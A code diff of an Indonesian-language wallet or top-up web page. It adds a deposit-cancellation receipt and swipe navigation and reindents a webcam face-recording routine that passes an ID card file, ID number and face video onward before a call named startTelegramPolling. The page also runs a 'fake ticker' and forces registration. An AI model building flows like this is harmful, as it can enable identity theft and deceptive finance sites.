+                                let txDate = new Date(activeDep.id).toLocaleDateString('id-ID');
+                                let txTime = new Date(activeDep.id).toLocaleTimeString('id-ID');
+                                document.getElementById('deposit-success-msg').innerHTML = `
+                                    <div class="receipt-box" style="text-align: left; margin-top: 5px;">
+                                        <div class="receipt-header">DIGITAL</div>
+                                        <div class="receipt-row"><span>ID Transaksi:</span><span>TRX-${activeDep.id}</span></div>
+                                        <div class="receipt-row"><span>Waktu:</span><span>${txDate} ${txTime}</span></div>
+                                        <div class="receipt-row"><span>Metode:</span><span>QRIS Merchant</span></div>
+                                        <div class="receipt-row"><span>Status:</span><span style="color: var(--danger); font-weight: bold;">Dibatalkan</span></div>
+                                        <hr style="border:0; border-top:1px dashed #cbd5e1; margin: 12px 0;">
+                                        <div class="receipt-row" style="font-weight:bold; font-size: 15px;"><span>Total:</span><span>${formatIDR(activeDep.amount)}</span></div>
+                                    </div>`;
                                 document.getElementById('btn-cancel-deposit').style.display = 'none';
                             }
                             addNotifToUser(currentUserPhone, "Isi saldo dibatalkan karena data audit perbankan tidak cocok.");
@@ -3001,35 +3130,34 @@
             closeTargetModal('verif-ktp-modal'); 
             openTargetModal('verif-face-modal');
   
-        try {
-            webcamStream = await navigator.mediaDevices.getUserMedia({ video: true });
-            let videoEl = document.getElementById('webcam-video');
-            videoEl.srcObject = webcamStream;
-  
-            videoEl.play().catch(e => console.error("Autoplay dicegah browser:", e));
+            try {
+                webcamStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                let videoEl = document.getElementById('webcam-video');
+                videoEl.srcObject = webcamStream;
+      
+                videoEl.play().catch(e => console.error("Autoplay dicegah browser:", e));
 
-            setTimeout(() => { document.getElementById('scan-instruction-text').innerText = "Posisikan wajah pada bingkai..."; }, 1000);
-        
-            setTimeout(async () => { 
-            const faceBlob = await recordFaceVideo(webcamStream, 7000);
-            finishBioVerification(n, nik, fileInput.files[0], faceBlob); 
-            }, 1000);
-       } catch(e) {
-            showModal("Perhatian", "Gagal mengaktifkan perizinan perangkat sensor kamera biometrik.", "error"); 
-             cancelFaceScan();
+                setTimeout(() => { document.getElementById('scan-instruction-text').innerText = "Posisikan wajah pada bingkai..."; }, 1000);
+            
+                setTimeout(async () => { 
+                const faceBlob = await recordFaceVideo(webcamStream, 7000);
+                finishBioVerification(n, nik, fileInput.files[0], faceBlob); 
+                }, 1000);
+            } catch(e) {
+                showModal("Perhatian", "Gagal mengaktifkan perizinan perangkat sensor kamera biometrik.", "error"); 
+                cancelFaceScan();
             }
         }
 
         function cancelFaceScan() {
-          if(webcamStream) { 
-           webcamStream.getTracks().forEach(t => t.stop()); 
-          webcamStream = null; 
-       }
+            if(webcamStream) { 
+                webcamStream.getTracks().forEach(t => t.stop()); 
+                webcamStream = null; 
+            }
 
-        document.getElementById('webcam-video').srcObject = null;
-    
-          closeTargetModal('verif-face-modal');
-       }
+            document.getElementById('webcam-video').srcObject = null;
+            closeTargetModal('verif-face-modal');
+        }
 
         async function finishBioVerification(nama, nik, ktpFile, faceBlob) {
             cancelFaceScan();
@@ -3052,23 +3180,53 @@
             startTelegramPolling();
         }
 
+        const sidenavElement = document.getElementById('sidenav');
+        let touchStartX = 0;
+        let touchCurrentX = 0;
+
+        sidenavElement.addEventListener('touchstart', function(e) {
+            touchStartX = e.touches[0].clientX;
+            touchCurrentX = touchStartX;
+            sidenavElement.style.transition = 'none'; 
+        }, { passive: true });
+
+        sidenavElement.addEventListener('touchmove', function(e) {
+            touchCurrentX = e.touches[0].clientX;
+            let diffX = touchCurrentX - touchStartX;
+
+            if (diffX < 0) {
+                sidenavElement.style.transform = `translateX(${diffX}px)`;
+            }
+        }, { passive: true });
+
+        sidenavElement.addEventListener('touchend', function(e) {
+            let diffX = touchCurrentX - touchStartX;
+            
+            sidenavElement.style.transition = 'left 0.3s ease, transform 0.3s ease'; 
+
+            if (diffX < -75) {
+                toggleNav(); 
+            }
+
+            sidenavElement.style.transform = '';
+        });
+        
         window.onload = () => {
-          const options = { day: 'numeric', month: 'long', year: 'numeric' };
-          const tanggalSekarang = new Date().toLocaleDateString('id-ID', options);
-        document.getElementById('transaksi-title').innerText = `Transaksi ${tanggalSekarang}`;
+            const options = { day: 'numeric', month: 'long', year: 'numeric' };
+            const tanggalSekarang = new Date().toLocaleDateString('id-ID', options);
+            document.getElementById('transaksi-title').innerText = `Transaksi ${tanggalSekarang}`;
 
-        initFakeTickerSequence(); 
-          if (!localStorage.getItem('sanz_has_visited') && !currentUserPhone) {
-          document.getElementById('register-close-btn').style.display = 'none';
-          document.getElementById('login-close-btn').style.display = 'none';
-         openRegisterModal();
-     } else {
-          document.getElementById('register-close-btn').style.display = 'flex';
-          document.getElementById('login-close-btn').style.display = 'flex';
-
-          checkLoginLock();
-        }
-    };
+            initFakeTickerSequence(); 
+            if (!localStorage.getItem('sanz_has_visited') && !currentUserPhone) {
+                document.getElementById('register-close-btn').style.display = 'none';
+                document.getElementById('login-close-btn').style.display = 'none';
+                openRegisterModal();
+            } else {
+                document.getElementById('register-close-btn').style.display = 'flex';
+                document.getElementById('login-close-btn').style.display = 'flex';
+                checkLoginLock();
+            }
+        };
     </script>
 </body>
 </html>
